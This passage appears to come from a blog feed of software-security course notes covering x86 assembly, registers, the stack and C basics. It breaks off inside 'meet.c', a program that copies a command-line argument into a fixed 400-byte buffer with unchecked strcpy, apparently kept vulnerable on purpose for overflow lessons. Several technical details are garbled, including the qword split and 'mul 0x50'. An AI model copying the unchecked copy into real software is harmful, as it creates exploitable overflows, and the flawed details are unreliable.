汇编语言是最接近机器码的高级语言，它可以将机器指令用人类可读的助记符（如 MOV、ADD、JMP 等）来表示。这使得程序员能够直接控制硬件，同时比直接编写二进制代码更加方便。&lt;/li&gt;
&lt;li&gt;与机器码的关系&lt;br&gt;
汇编语言是最可靠的、可以从机器码中恢复的高级语言。如果高层语言的源代码不可用时，通过反汇编（disassembly），可以将机器码转换回对应的汇编代码。&lt;br&gt;
汇编语言和机器码之间的对应关系使得程序员可以清楚地了解计算机底层的执行逻辑和流程。&lt;/li&gt;
&lt;li&gt;脆弱代码和恶意软件的存储形式&lt;br&gt;
在内存或磁盘中，脆弱代码或恶意软件通常以二进制形式（即机器码）存储。这种形式是计算机直接执行的代码，但对人类而言不可读。&lt;/li&gt;
&lt;li&gt;反汇编器的作用&lt;br&gt;
反汇编器是一种工具，它以二进制代码为输入，并将其翻译成相应的汇编代码输出。通过反汇编，可以将机器码还原为人类可读的汇编语言，有助于分析和调试程序，特别是在逆向工程或安全分析中。&lt;/li&gt;
&lt;li&gt;汇编语言是多种语言的集合&lt;br&gt;
汇编语言实际上是多种语言的集合，因为不同的计算机架构（如 x86、ARM、MIPS 等）有各自独特的指令集和汇编语言格式。&lt;br&gt;
在学习和使用汇编语言时，通常会针对特定的计算机架构进行深入研究。例如，x86 汇编和 ARM 汇编在指令集、寄存器使用和指令格式上都有明显的不同。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/25/671b4f21f3929.png&#34; alt=&#34;img&#34;&gt;&lt;br&gt;
 整个过程从汇编语言（asm 文件）开始，通过汇编器生成目标文件，再通过链接器将目标文件和库文件结合生成可执行文件，最后将可执行文件加载到内存中运行&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;汇编器（Assembler）&lt;br&gt;
汇编器的作用是将汇编语言的代码（asm 文件）翻译成目标文件（object file）。目标文件是二进制形式的文件，包含了机器可以理解的指令和数据，但还不是完整的可执行程序。&lt;/li&gt;
&lt;li&gt;链接器（Linker）&lt;br&gt;
链接器的作用是将多个目标文件和库文件（如静态库或动态库）组合起来，生成一个完整的可执行文件（Executable）。&lt;br&gt;
静态库（Static Library）：静态库中的代码在编译期间直接被链接到可执行文件中。&lt;br&gt;
动态库（Dynamic Library）：动态库中的代码在运行时被加载到内存中。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Assembler vs. Compiler&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;编译器 (Compiler) vs. 汇编器 (Assembler)&lt;br&gt;
 编译器：将高级编程语言的代码（如 C、C++、Java 等）转换为机器级代码。&lt;br&gt;
汇编器：将汇编语言的代码转换为机器级代码。&lt;/li&gt;
&lt;li&gt;输入&lt;br&gt;
编译器：以高级语言的源代码为输入。&lt;br&gt;
汇编器：以汇编语言的代码为输入。&lt;/li&gt;
&lt;li&gt;转换方式&lt;br&gt;
编译器：会检查并一次性将整个代码转换为机器代码。&lt;br&gt;
汇编器：一般不一次性转换完整代码，而是分两步处理。&lt;/li&gt;
&lt;li&gt;内部模块&lt;br&gt;
编译器：包含词法分析器、语法分析器、语义分析器、代码优化器和代码生成器等模块。(lexical analyzer, Syntax analyzer, Semantic analyzer, Code optimizer, Code generator)&lt;br&gt;
 汇编器：在两次扫描中完成所有工作。&lt;/li&gt;
&lt;li&gt;输出结果&lt;br&gt;
编译器：输出的是机器代码的助记符 (Mnemonic) 版本。&lt;br&gt;
汇编器：输出的是机器代码的二进制版本。&lt;/li&gt;
&lt;li&gt;常见类型&lt;br&gt;
编译器：如 C、C++、Java 的编译器。&lt;br&gt;
汇编器：如 GAS（GNU Assembler）、GNU 汇编器&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Two main forms of assembly syntax&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;NASM format: &lt;instr&gt; &lt;dest&gt;, &lt;source&gt; &amp;lt;; comment&amp;gt; : mov eax, 10&lt;/li&gt;
&lt;li&gt;AT&amp;amp;T format:  &lt;instr&gt; &lt;source&gt;, &lt;dest&gt; &amp;lt;# comment&amp;gt;: mov $10, %eax&lt;br&gt;
AT&amp;amp;T format reverses the order of operands, uses a % before registers and a $ before literal values&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Fundamental Data Types&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/25/671b528c52025.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Byte（字节）&lt;br&gt;
大小：1 字节 = 8 位（bit）。&lt;br&gt;
示例：图中展示的 5D 是一个 8 位的二进制数（01011101），它可以用一个字节来表示。&lt;br&gt;
解释：一个字节的二进制位可以表示 0 到 255 之间的整数（无符号），或 -128 到 127 之间的整数（有符号）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Word（字）&lt;br&gt;
大小：2 字节 = 16 位（bit）。&lt;br&gt;
示例：图中展示的 8BEC 表示一个 16 位的二进制数，其中：&lt;br&gt;
高字节（High Byte）：8B&lt;br&gt;
 低字节（Low Byte）：EC&lt;br&gt;
 解释：一个 Word 可以表示 0 到 65535 之间的无符号整数，或 -32768 到 32767 之间的有符号整数。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Dword（双字）&lt;br&gt;
大小：4 字节 = 32 位（bit）。&lt;br&gt;
示例：图中展示的 000136CF 表示一个 32 位的二进制数，其中：&lt;br&gt;
高字（High Word）：0001&lt;br&gt;
 低字（Low Word）：36CF&lt;br&gt;
 解释：一个 Dword 可以表示更大的整数范围，用于存储更大的数值或内存地址。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Qword（四字）&lt;br&gt;
大小：8 字节 = 64 位（bit）。&lt;br&gt;
示例：图中展示的 CF000136CF 表示一个 64 位的二进制数，其中：&lt;br&gt;
高双字（High Dword）：CF00&lt;br&gt;
 低双字（Low Dword）：0136CF&lt;br&gt;
 解释：一个 Qword 可以表示更大的整数或浮点数范围，常用于 64 位处理器上的运算。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Data in Memory&lt;br&gt;
Little-endian format: a low-order byte is stored at the lower address&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/25/671b538e3e57f.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;CPU Registers&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#CPU Registers&#34;&gt;#&lt;/a&gt;CPU Registers&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;CPU 寄存器是 CPU 内部的一小部分数据存储单元，用于暂存指令、数据和状态信息。寄存器是 CPU 中速度最快的存储单元，比其他存储设备（如 RAM、硬盘）快得多，因为它们位于 CPU 内部，能够快速读写数据。&lt;br&gt;
CPU 寄存器的类型&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;通用寄存器（General Registers）&lt;br&gt;
用途：在程序执行期间由 CPU 使用，用于存储数据、操作数和临时结果。&lt;br&gt;
功能：可以用于整数运算、地址运算和数据的传输，是最常用的寄存器类型。&lt;/li&gt;
&lt;li&gt;段寄存器（Segment Registers）&lt;br&gt;
用途：用于管理和跟踪内存的不同段（如代码段、数据段和栈段）。&lt;br&gt;
功能：帮助 CPU 确定内存访问的具体区域，使得内存分段管理更加高效。&lt;/li&gt;
&lt;li&gt;状态标志（Status Flags）&lt;br&gt;
用途：存储程序执行的状态信息，例如运算结果是正、负、零，或是否发生溢出等。&lt;br&gt;
功能：在 CPU 进行条件判断或决策时提供必要的信息支持，决定程序的执行路径。&lt;/li&gt;
&lt;li&gt;指令指针（Instruction Pointers）&lt;br&gt;
用途：用于跟踪下一条将要执行的指令的地址。&lt;br&gt;
功能：确保程序的指令按顺序执行，是控制程序流程的关键寄存器。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;x86 Registers
&lt;ol&gt;
&lt;li&gt;数据寄存器（Data Registers）
&lt;ul&gt;
&lt;li&gt;EAX（累加器）：主要用于输入 / 输出和大多数算术运算。例如，加法、减法、乘法和除法操作时，通常会用到 EAX。&lt;/li&gt;
&lt;li&gt;EBX（基址寄存器）：可用于索引寻址模式，即在访问数组或结构中的元素时，EBX 可以作为基址寄存器使用。&lt;/li&gt;
&lt;li&gt;ECX（计数寄存器）：在循环操作中存储循环计数，通常用于实现迭代操作。&lt;/li&gt;
&lt;li&gt;EDX（数据寄存器）：也用于输入 / 输出操作，有时与 AX 一起使用，例如在某些乘法和除法运算中。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;索引寄存器（Index Registers）
&lt;ul&gt;
&lt;li&gt;ESI（源索引）：用于字符串操作的源索引，通常在数据的读取操作中使用。&lt;/li&gt;
&lt;li&gt;EDI（目标索引）：用于字符串操作的目标索引，通常在数据的写入操作中使用。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;段寄存器（Segment Registers）
&lt;ul&gt;
&lt;li&gt;CS（代码段寄存器）：指向包含所有将要执行的指令的代码段。&lt;/li&gt;
&lt;li&gt;DS（数据段寄存器）：指向包含全局数据、常量和工作区的数据段。&lt;/li&gt;
&lt;li&gt;SS（栈段寄存器）：指向包含局部数据和过程或子程序返回地址的栈段。&lt;/li&gt;
&lt;li&gt;其他段寄存器（ES、FS、GS）：提供额外的数据存储段，用于存放其他类型的数据。&lt;br&gt;
在段内的所有内存位置都相对于段的起始地址。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;状态寄存器（Status Register）
&lt;ul&gt;
&lt;li&gt;EFLAGS 寄存器：用于存储处理器的状态标志，每个标志位表示不同的状态或条件：&lt;/li&gt;
&lt;li&gt;ZF（零标志）：当运算结果为零时设置。&lt;/li&gt;
&lt;li&gt;CF（进位标志）：当运算结果过大或过小时设置。&lt;/li&gt;
&lt;li&gt;SF（符号标志）：当运算结果为负时设置。&lt;/li&gt;
&lt;li&gt;TF（陷阱标志）：用于调试，设置该标志时，处理器一次只执行一条指令。通常被调试工具（如 GDB）使用。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;指令指针（Instruction Pointer, EIP）也称为程序计数器，它包含下一条将被执行的指令的偏移地址。
&lt;ul&gt;
&lt;li&gt;EIP 的唯一目的是告诉处理器下一步要执行什么指令。&lt;/li&gt;
&lt;li&gt;当前指令的完整地址为 CS:EIP（代码段寄存器加指令指针）。&lt;/li&gt;
&lt;li&gt;如果攻击者能够控制 EIP，他们就能控制 CPU 的执行流程，因此 EIP 是常见攻击（如缓冲区溢出）的目标。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其他指针寄存器（Other Pointer Registers）
&lt;ul&gt;
&lt;li&gt;ESP（栈指针寄存器）：提供程序栈中的偏移值，SS:ESP 表示栈顶（当前数据或地址在程序栈中的位置）。&lt;/li&gt;
&lt;li&gt;EBP（基址指针寄存器）：主要用于引用传递给子程序的参数变量（如函数调用）。SS:EBP 表示当前调用的栈帧 (stack frame)。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;Assembly basics&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Assembly basics&#34;&gt;#&lt;/a&gt; Assembly basics&lt;/h1&gt;
&lt;h2 id=&#34;Simple Instructions&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Simple Instructions&#34;&gt;#&lt;/a&gt;Simple Instructions&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;mov instruction&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/25/671b589f37dc7.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;lea (load effective address) instruction puts a memory address into the&lt;br&gt;
destination&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;e.g. lea eax, [ebx+8] puts EBX+8 into EAX&lt;/li&gt;
&lt;li&gt;e.g. mov eax, [ebx+8] loads the data at the memory address EBX+8&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/25/671b595145504.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mov eax, [ebx+8] places the value 0x20 into EAX&lt;/li&gt;
&lt;li&gt;lea eax, [ebx+8] places the value 0xB30048 into EAX&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Arithmetic&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;sub eax, 0x10&lt;br&gt;
 描述：从寄存器 EAX 中减去 0x10（十六进制的 16）。&lt;br&gt;
结果：EAX 的值减少 16。&lt;/li&gt;
&lt;li&gt;add eax, ebx&lt;br&gt;
 描述：将寄存器 EBX 的值加到 EAX 中，并将结果存储在 EAX 中。&lt;br&gt;
结果：EAX = EAX + EBX。&lt;/li&gt;
&lt;li&gt;inc edx&lt;br&gt;
 描述：将寄存器 EDX 的值加 1。&lt;br&gt;
结果：EDX 的值增加 1。&lt;/li&gt;
&lt;li&gt;dec ecx&lt;br&gt;
 描述：将寄存器 ECX 的值减 1。&lt;br&gt;
结果：ECX 的值减少 1。&lt;/li&gt;
&lt;li&gt;mul 0x50&lt;br&gt;
 描述：将寄存器 EAX 的值乘以 0x50（十六进制的 80），并将结果存储在 EDX&lt;br&gt;
 中。&lt;br&gt;
结果：EAX 中存储低 32 位的乘积，EDX 中存储高 32 位的乘积。&lt;/li&gt;
&lt;li&gt;div 0x75&lt;br&gt;
 描述：用寄存器 EDX&lt;br&gt;
（将 EDX 和 EAX 结合起来，表示 64 位的数值）除以 0x75（十六进制的 117）。&lt;br&gt;
结果：商存储在 EAX 中，余数存储在 EDX 中。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Logics&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;xor eax, eax&lt;br&gt;
 描述：将寄存器 EAX 和自身进行异或操作，清除 EAX 中的值（即将 EAX 置为 0）。&lt;br&gt;
结果：EAX = 0。&lt;/li&gt;
&lt;li&gt;or eax, 0x7575&lt;br&gt;
 描述：对 EAX 寄存器和 0x7575 进行逻辑或（OR）操作。&lt;br&gt;
结果：EAX 的每个位都与 0x7575 的相应位进行或操作。&lt;/li&gt;
&lt;li&gt;mov eax, 0xA 和 shl eax, 2&lt;br&gt;
mov eax, 0xA：将 EAX 设置为 0xA（十六进制的 10）。&lt;br&gt;
shl eax, 2：将 EAX 寄存器中的值左移 2 位。&lt;br&gt;
结果：EAX 的值变为 0x28（十六进制的 40），因为二进制的 1010 左移 2 位变为 101000。&lt;/li&gt;
&lt;li&gt;mov bl, 0xA 和 ror bl, 2&lt;br&gt;
mov bl, 0xA：将 BL 设置为 0xA（十六进制的 10）。&lt;br&gt;
ror bl, 2：将 BL 寄存器中的值右旋 2 位。&lt;br&gt;
结果：BL 的值变为 10000010，因为二进制的 1010 右旋 2 位变为 10000010。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;nop&lt;br&gt;
 描述：NOP 指令不执行任何操作，仅仅让处理器继续执行下一条指令。&lt;br&gt;
作用：NOP 实际上是 xchg eax, eax 的伪指令，因为将 EAX 与自身交换不会改变任何值。&lt;br&gt;
用途：在缓冲区溢出攻击中，攻击者常使用 NOP 指令来填充攻击代码，使得执行具有一定的缓冲空间。NOP 的操作码是 0x90。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;The Stack&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#The Stack&#34;&gt;#&lt;/a&gt;The Stack&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;栈的基本概念&lt;br&gt;
栈 是一种 后进先出（LIFO） 的数据结构，这意味着最后放入的数据将是第一个被取出的。&lt;br&gt;
栈通常用于存储函数调用的参数、局部变量、返回地址和一些控制信息。&lt;br&gt;
栈的主要寄存器包括：&lt;br&gt;
ESP（栈指针）：指向当前栈顶。&lt;br&gt;
EBP（基址指针）：跟踪局部变量和函数参数的位置。&lt;/li&gt;
&lt;li&gt;栈指令&lt;br&gt;
栈操作包括以下几种常见指令：&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;push：将数据压入栈中，ESP 会减少（栈向下增长）。&lt;/li&gt;
&lt;li&gt;pop：从栈中弹出数据，ESP 会增加。&lt;/li&gt;
&lt;li&gt;call：调用函数，将当前指令的地址压入栈中，并跳转到指定函数的位置。&lt;/li&gt;
&lt;li&gt;leave：用于函数返回时，将栈恢复到调用者的状态。&lt;/li&gt;
&lt;li&gt;enter：为新函数栈帧分配空间，保存当前的 EBP，并更新 EBP 为新栈帧的起始位置。&lt;/li&gt;
&lt;li&gt;ret：函数返回，将栈顶的返回地址弹出到 EIP 中，恢复程序的执行。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;函数调用的栈操作&lt;br&gt;
在函数调用过程中，栈的使用通常按照以下步骤进行：&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;参数入栈：使用 push 指令将函数的参数依次压入栈中。&lt;/li&gt;
&lt;li&gt;调用函数：使用  &lt;code&gt;call &amp;lt;location&amp;gt;&lt;/code&gt;  指令调用函数。当前指令地址（EIP）会被压入栈中，便于函数执行完毕后返回。EIP 将被设置为函数的起始地址（ &lt;code&gt;&amp;lt;location&amp;gt;&lt;/code&gt; ）。&lt;/li&gt;
&lt;li&gt;保存局部变量和 EBP：函数调用后，局部变量和调用者的 EBP 被压入栈中，用于为新函数栈帧分配空间。&lt;/li&gt;
&lt;li&gt;执行函数：函数内部执行具体的任务，包括访问局部变量、处理逻辑和修改数据。&lt;/li&gt;
&lt;li&gt;恢复局部变量和调用者的 EBP：使用 leave 指令，将 EBP 和局部变量恢复为调用者的状态。&lt;/li&gt;
&lt;li&gt;恢复 EIP：使用 ret 指令，将栈顶的返回地址弹出到 EIP 中，以继续执行调用函数的程序。&lt;/li&gt;
&lt;li&gt;清理参数：参数在函数返回后可能需要被清理，从而恢复栈的平衡状态。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/25/671b64bb0713f.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;Conditionals and Branching&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Conditionals and Branching&#34;&gt;#&lt;/a&gt;Conditionals and Branching&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;条件指令（Conditionals）
&lt;ol&gt;
&lt;li&gt;test 指令&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;功能：test 指令类似于逻辑与（AND）操作，但不会修改操作数，只用于设置标志位。&lt;/li&gt;
&lt;li&gt;标志位：主要设置 ZF（零标志）。如果操作数之间的逻辑与结果为零，则 ZF 被置 1，否则置 0。&lt;/li&gt;
&lt;li&gt;用法：通常用于检查某个位是否被设置，例如判断一个变量是否为零或检测特定位是否为 1。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;cmp 指令&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;功能：cmp 指令类似于减法（SUB）操作，但不会改变操作数的值，只用于设置标志位。&lt;/li&gt;
&lt;li&gt;标志位：主要设置 ZF（零标志） 和 CF（进位标志）。&lt;/li&gt;
&lt;li&gt;ZF（零标志）：当两个操作数相等时，ZF 被置 1。&lt;/li&gt;
&lt;li&gt;CF（进位标志）：当目标操作数小于源操作数时，CF 被置 1。&lt;/li&gt;
&lt;li&gt;用法：通常用于比较两个数值大小，以决定下一步的条件跳转。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;cmp 指令的标志位结果&lt;br&gt;
 cmp dst, src 的不同结果下的标志位变化：&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;dst = src：ZF = 1, CF = 0（目标操作数等于源操作数）。&lt;/li&gt;
&lt;li&gt;dst &amp;lt; src：ZF = 0, CF = 1（目标操作数小于源操作数）。&lt;/li&gt;
&lt;li&gt;dst &amp;gt; src：ZF = 0, CF = 0（目标操作数大于源操作数）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;分支指令（Branching）&lt;br&gt;
分支是根据程序的控制流有条件地执行代码序列。分支指令决定程序在特定条件下的跳转。
&lt;ol&gt;
&lt;li&gt;无条件跳转（Unconditional Jump）&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;jmp &lt;location&gt;：无条件跳转指令会直接跳转到指定的位置（&lt;location&gt;），无论条件是否满足。&lt;/li&gt;
&lt;li&gt;用法：无条件跳转用于改变程序的执行顺序，是一种不依赖标志位的跳转形式。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;条件跳转（Conditional Jump）&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;条件跳转指令：使用标志寄存器的值来决定是否进行跳转。常见的条件跳转指令有超过 30 种。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/course/C-language-basics-and-Computer-memory/</guid>
            <title>C language basics and Computer memory</title>
            <link>http://example.com/course/C-language-basics-and-Computer-memory/</link>
            <category>software security</category>
            <category>Linux</category>
            <category>C language</category>
            <pubDate>Thu, 24 Oct 2024 21:00:05 +1000</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;C language basics&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#C language basics&#34;&gt;#&lt;/a&gt;C language basics&lt;/h1&gt;
&lt;h2 id=&#34;input/output&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#input/output&#34;&gt;#&lt;/a&gt; input/output&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;To print output to the terminal screen:&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;printf(“Hello\n”);&lt;/li&gt;
&lt;li&gt;printf(“Hello %s”, “haxor”);  // using a format string&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;To get input from the user:&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;scanf(&amp;quot;%d&amp;quot;, &amp;amp;number);&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Input/output format symbols&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;test\n&amp;quot;&lt;/span&gt;);   &lt;span class=&#34;comment&#34;&gt;// `\n`:  Carriage return/new line&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;test %d&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;123&lt;/span&gt;);  &lt;span class=&#34;comment&#34;&gt;//`%d`:  Decimal value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;test %s&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;123&amp;quot;&lt;/span&gt;);  &lt;span class=&#34;comment&#34;&gt;//`%s`:  String value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;test %x&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x123&lt;/span&gt;);  &lt;span class=&#34;comment&#34;&gt;//`%x`:  Hex value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;C Program takes command-line arguments&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//meet.c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;greeting(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *temp1, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *temp2) &lt;span class=&#34;comment&#34;&gt;// greeting function to say hello&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; name[&lt;span class=&#34;number&#34;&gt;400&lt;/span&gt;];  &lt;span class=&#34;comment&#34;&gt;// string variable to hold the name&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(name, temp2);  &lt;span class=&#34;comment&#34;&gt;// copy function argument to name&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Hello %s %s\n&amp;quot;&lt;/span&gt;, temp1, name);  &lt;span class=&#34;comment&#34;&gt;// print out the greeting&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *argv[]) &lt;span class=&#34;comment&#34;&gt;// note the format for arguments&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    greeting(argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;], argv[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]);  &lt;span class=&#34;comment&#34;&gt;// call 